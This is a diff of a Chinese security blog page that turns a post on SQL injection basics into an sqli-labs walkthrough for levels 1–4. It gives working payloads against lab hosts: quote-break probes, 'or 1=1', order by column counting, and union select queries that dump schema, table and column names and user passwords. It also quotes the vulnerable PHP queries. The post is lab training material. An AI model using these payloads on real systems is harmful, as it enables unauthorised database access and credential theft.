@@ -17,7 +17,7 @@
   <meta name="description" content="">
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
-  <title>sqli手注基础 - SuQieR&#39;s Blog</title>
+  <title>sqli_less1-4 - SuQieR&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
 
@@ -152,7 +152,7 @@
 </nav>
 
     <div class="banner intro-2" id="background" parallax=true
-         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727145833.jpg') no-repeat center center;
+         style="background: url('https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814123743.jpg') no-repeat center center;
            background-size: cover;">
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
@@ -165,8 +165,8 @@
               
   <div class="mt-3 post-meta">
     <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-    <time datetime="2020-07-27 11:29">
-      July 27, 2020 am
+    <time datetime="2020-07-30 11:29">
+      July 30, 2020 am
     </time>
   </div>
 
@@ -176,7 +176,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      794 字
+      1.1k 字
     </span>
   
 
@@ -186,7 +186,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      11
+      20
        分钟
     </span>
   
@@ -217,106 +217,254 @@
           <div class="post-content mx-auto" id="post">
             
             <article class="markdown-body">
-              <h1 id="sql-labs-手注"><a href="#sql-labs-手注" class="headerlink" title="sql-labs 手注"></a>sql-labs 手注</h1><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul>
-<li>早在之前就接触过sql-labs，前两次加起来好像是过了前面十几关把，且也没有详细的做笔记。一两个月没接触，基本忘的差不多了，所以才有了这次三刷sql-labs。</li>
-<li>靶场搭建，其实很简单改一下数配置文件数据库连接密码就行了。这里这里直接略过，不会的话移步百度。</li>
-</ul>
-<h2 id="sql注入基础知识"><a href="#sql注入基础知识" class="headerlink" title="sql注入基础知识"></a>sql注入基础知识</h2><ol>
-<li><p>sql注入的分类</p>
+              <h1 id="sqli-less-1-4"><a href="#sqli-less-1-4" class="headerlink" title="sqli less 1-4"></a>sqli less 1-4</h1><h3 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h3><ul>
+<li><p>直接在url后添加了‘号触发报错，效果如图</p>
+<table>
+<thead>
+<tr>
+<th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134051.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>从上述错误中，可以看到1’经过sql语句构造后形成<code>&#39;&#39;1&#39;&#39; LIMIT 0,1&#39;</code> 多出了个单引号，从错误中得到想要的信息后，通过<code>&#39;or 1=1 --+</code>注释将多余的’去掉</p>
+</li>
+<li><p>构造的sql语句应该如下表格中显示的一致,提交后正常返回数据</p>
+<table>
+<thead>
+<tr>
+<th>select * from users where id=’1’ or 1=1 –+’ limit 0,1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727134851.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>此处可以用order by对数据进行排列，超过一定列数会报错，可以利用这一机制探测列数</p>
 <ul>
-<li>基于服务器接受到的响应分类<ul>
-<li>基于错误的sql注入</li>
-<li>联合查询的类型</li>
-<li>堆查询注入</li>
-<li>sql盲注<ul>
-<li>基于布尔的sql盲注</li>
-<li>基于时间的sql盲注</li>
-<li>基于报错的sql盲注</li>
+<li>这里只能用order by 3 ，超过order by3 就会报错</li>
+<li><code>&#39;order by 4--+</code>的结果显示超出</li>
 </ul>
+<table>
+<thead>
+<tr>
+<th><a href="http://172.18.9.66/sqli/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://172.18.9.66/sqli/Less-1/?id=1&#39;</a> order by 4 –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135418.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 </li>
-</ul>
-</li>
-<li>基于如何处理输入的sql注入<ul>
-<li>字符串类型</li>
-<li>数字类型</li>
-</ul>
-</li>
-<li>基于程度和顺序的注入<ul>
-<li>一阶注入(一阶注入指的是输入的sql语句直接对web服务产生了影响)</li>
-<li>二阶注入(二阶则是类似存储xss，指提交的sql语句无法对web服务产生影响，但可以通过其他辅助间接触发对web的伤害)</li>
-</ul>
-</li>
-<li>基于注入点的分类<ul>
-<li>通过用户输入的表单域的注入</li>
-<li>通过cookie的注入</li>
-<li>通过服务器变量的注入(头部注入)</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>常用函数</p>
+<li><p>分析源码为什么会造成sql注入，查询的sql语句如下</p>
+<table>
+<thead>
+<tr>
+<th>select * from users where id=’$id’ limit 0,1;</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727135610.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
 <ul>
-<li>系统函数<ul>
-<li>version()  –&gt; Mysql版本</li>
-<li>user() –&gt; 数据库用户名</li>
-<li>database() –&gt; 数据库名</li>
-<li>@@datadir –&gt;数据库路径</li>
-<li>@@version_compile_os –&gt; 操作系统版本</li>
-</ul>
-</li>
-<li>字符串连接函数<ul>
-<li>concat(str1,str2,…) 没有分隔符的连接字符串</li>
-<li>concat_ws((separator,str1, str2) 含有分割符的连接字符串</li>
-<li>group_concat(str1,str2)  连接一个组的所有字符串，并以逗号分隔每一条数据</li>
-<li>上面的解释比较抽象，其实也不用了解的这么详细，只需要知道这三个函数能一次性查出信息就行了</li>
-</ul>
+<li><p>id 在拼接sql语句时，没有对id进行任何过滤，当提交<code>&#39; or 1=1 --+</code> 构造的sql语句就是</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-string">''</span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-comment">--+ limit 0,1;</span>
+这条语句因 <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> 所以永恒为真</code></pre>
 </li>
 </ul>
 </li>
-<li><p>一般用于尝试的语句</p>
+<li><p>这里着重记一下union联合注入，union的作用是将两个sql语句进行联合。强调一下union前后的两个sql语句的选择列数要相同才可以。union all 和 union  的区别是增加了去重的功能。</p>
 <ul>
-<li><p>–+ 可以用#替换，url提交过程中#号经过url编码后为%23</p>
-<ul>
-<li>or 1=1 –+</li>
-<li>‘  or 1=1 –+</li>
-<li>“  or 1=1 –+</li>
-<li>) or 1=1 –+</li>
-<li>‘) or 1=1 –+</li>
-<li>“) or 1=1 –+</li>
-<li>“)) or 1=1 –+</li>
+<li><p>结合sql注入基础篇中的information_schema的知识点，对less1进行注入。</p>
+</li>
+<li><p>当id的数据在数据库中不存在时，可以id=-1，两个sql语句进行联合操作时，当前一个语句查询内容为空时，后面的语句内容才会显示出来，此处网页返回了构造的union数据</p>
+</li>
+<li><p>爆数据库 payload:</p>
+<pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(schema_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.schemata <span class="hljs-comment">--+</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>此处sql语句为 select * from users where id =’-1’ union select 1,group_concat(schema_name),3 from information_schema.schemata –+ limit 0,1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814101641.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
 </ul>
 </li>
-<li><p>一般的代码为:</p>
-<pre><code class="hljs php">$id = $_GET[<span class="hljs-string">'id'</span>];
-$sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"</span></code></pre>
+</ul>
+<ul>
+<li><p>爆当前数据库的数据表payload:</p>
+<pre><code class="hljs sql">http://172.18.9.66/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(table_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">"security"</span> <span class="hljs-comment">--+</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>sql语句为 select * from users where id = ‘-1’ union select 1,group _concat(table_name),3 from information_schema.tables  where table_schema = “security” –+ limit 0,1</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200727154802.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>爆users表的列</p>
+<pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-keyword">group_concat</span>(column_name),<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name = <span class="hljs-string">"users"</span> <span class="hljs-comment">--+</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>sql语句: select * from users where id=’-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name = “users” –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814103732.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>爆数据</p>
+<pre><code class="hljs sql">http://192.168.5.135/sqli/Less-1/?id=-1%27 union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,username,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">3</span> <span class="hljs-comment">--+</span></code></pre>
+
+<table>
+<thead>
+<tr>
+<th>sql语句：select * from user where id = ‘-1’  union select 1,username,password from users  where id=3 –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814105002.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+<ul>
+<li>less 1-4都可以使用union联合注入，下文不重复操作了。</li>
+</ul>
+<h3 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h3><ul>
+<li><p>将单引号添加到id后，返回报错</p>
+<table>
+<thead>
+<tr>
+<th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814114531.png" srcset="/img/loading.gif" alt=""></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>You have an error in your SQL syntax; check the  manual that corresponds to your MySQL server version for the right  syntax to use near ‘’ LIMIT 0,1’ at line 1</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>执行的查询语句为</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span>  <span class="hljs-keyword">table</span> <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-number">1</span><span class="hljs-string">'</span></code></pre>
 
 <ul>
-<li>此处应该考虑两个点，一个是闭合前面的’，一个是处理后面的’，采用两种思路，闭合后面的引号或者注释点，注释采用–+或#(%23)</li>
+<li>报错多了一个单引号，所以这里的单引号破坏了查询返回了报错，查询代码应该为 id= 一个整数</li>
 </ul>
-</li>
-</ul>
-</li>
-<li><p>information_schema数据库</p>
-<ul>
-<li><p>information_schema数据库只有在mysql5.0以上的版本才有，该数据库中存放着其他数据库的信息，这里需要记得是里面的几个表是干嘛的就行了</p>
-<ul>
-<li>SCHEMATA –&gt; 存储数据库名，关键字段：SCHEMA_NAME，表示数据库名称。show databases()的结果就是取自于此。</li>
-<li>TABLES –&gt; 存储表名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示表的名称。</li>
-<li>COLUMNS —-―&gt;存储字段名，关键字段：TABLE_SCHEMA表示表所属的数据库名称;TABLE_NAME表示所属的表的名称，COLUMN_NAME表示字段名。</li>
-</ul>
-<pre><code class="hljs sql">猜数据库
-<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata 
-猜某库的表
-<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=’xxxxx’ 
-猜某表的列
-<span class="hljs-keyword">Select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name=’xxxxx’ 
-获取某列的所有内容
-<span class="hljs-keyword">Select</span> *** <span class="hljs-keyword">from</span> ****</code></pre>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> talbe  <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = <span class="hljs-built_in">int</span></code></pre>
 
+<ul>
+<li>打开less2源代码sql查询语句如下，id没有经过处理</li>
+</ul>
+<pre><code class="hljs sql">$sql="<span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">users</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-keyword">id</span> = $<span class="hljs-keyword">id</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">";</span></code></pre>
+
+<ul>
+<li>可成功的注入为</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>or 1= 1 –+     # 这里不加–+只用or 1=1 也可以</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814115823.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>其余的payload和less1一样，将单引号’去掉即可，不重复了。</p>
 </li>
 </ul>
+<h3 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h3><ul>
+<li><p>输入单引号报错</p>
+<table>
+<thead>
+<tr>
+<th><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120120.png" srcset="/img/loading.gif" alt=""></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘’1’’) LIMIT 0,1’ at  line 1</td>
+</tr>
+</tbody></table>
+<ul>
+<li><p>从返回的报错来看，多出了一个)，那么查询语句应该为</p>
+<pre><code class="hljs sql"><span class="hljs-keyword">select</span> login_name,<span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> talbe <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span> = ($<span class="hljs-keyword">id</span>)</code></pre>
 </li>
-</ol>
+<li><p>补全),使用该代码注入<code>?id=1&#39;)--+</code>,这样一来就输出账号密码了，后续的查询也被注释了</p>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><a href="http://192.168.5.135/sqli/Less-3/?id=1&#39;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-3/?id=1&#39;</a>) –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814120617.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>可成功注入的有</p>
+<pre><code class="hljs sql">')or'1'=('1
+)or1=1<span class="hljs-comment">--+</span></code></pre>
+</li>
+<li><p>其余payload在less1的’后加)即可</p>
+</li>
+</ul>
+<h3 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h3><ul>
+<li><p>输入id=1”</p>
+<table>
+<thead>
+<tr>
+<th><img src="C:%5CUsers%5CHeBe%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200814121202249.png" srcset="/img/loading.gif" alt="image-20200814121202249"></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>You have an error  in your SQL syntax; check the manual that corresponds to your MySQL  server version for the right syntax to use near ‘“1””) LIMIT 0,1’ at  line 1</td>
+</tr>
+</tbody></table>
+<ul>
+<li>多了一个双引号和反括号，可见这是对id参数使用了””和()进行包装</li>
+<li>使用<code>id=1 &quot;) --+</code>进行注入，输出了账号密码，后续查询也被注释掉了</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><a href="http://192.168.5.135/sqli/Less-4/?id=1&quot;" target="_blank" rel="noopener">http://192.168.5.135/sqli/Less-4/?id=1&quot;</a>) –+</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><img src="https://lynn-sec-blogimage.oss-cn-shenzhen.aliyuncs.com/img/20200814121427.png" srcset="/img/loading.gif" alt=""></td>
+</tr>
+</tbody></table>
+</li>
+<li><p>查询源代码得知查询语句为<code>$sql=&quot;SELECT*FROMusersWHEREid=(“$id”)LIMIT0,1&quot;;</code></p>
+<ul>
+<li>可成功注入payload</li>
+</ul>
+<pre><code class="hljs sql">“)or”1”=(“1
+“)or1=1<span class="hljs-comment">--+</span></code></pre>
+</li>
+<li><p>其他payload同less1，将‘替换为”)即可</p>
+</li>
+</ul>
 
             </article>
             <hr>
@@ -347,18 +495,12 @@ $sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"<
                   <div class="post-prev col-6">
                     
                     
-                      <a href="/2020/07/30/sqli_less_1-4/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">sqli_less1-4</span>
-                        <span class="visible-mobile">Previous</span>
-                      </a>
-                    
                   </div>
                   <div class="post-next col-6">
                     
                     
-                      <a href="/2020/07/24/docker-compose%E5%B0%8F%E8%AE%B0/">
-                        <span class="hidden-mobile">docker-compose小记</span>
+                      <a href="/2020/07/27/sqli%E6%89%8B%E6%B3%A8%E5%9F%BA%E7%A1%80/">
+                        <span class="hidden-mobile">sqli手注基础</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
@@ -517,7 +659,7 @@ $sql = <span class="hljs-string">"SELECT * FROM users WHERE id ='$id'LIMIT 0,1"<
     var typed = new Typed('#subtitle', {
       strings: [
         '  ',
-        "sqli手注基础&nbsp;",
+        "sqli_less1-4&nbsp;",
       ],
       cursorChar: "_",
       typeSpeed: 70,
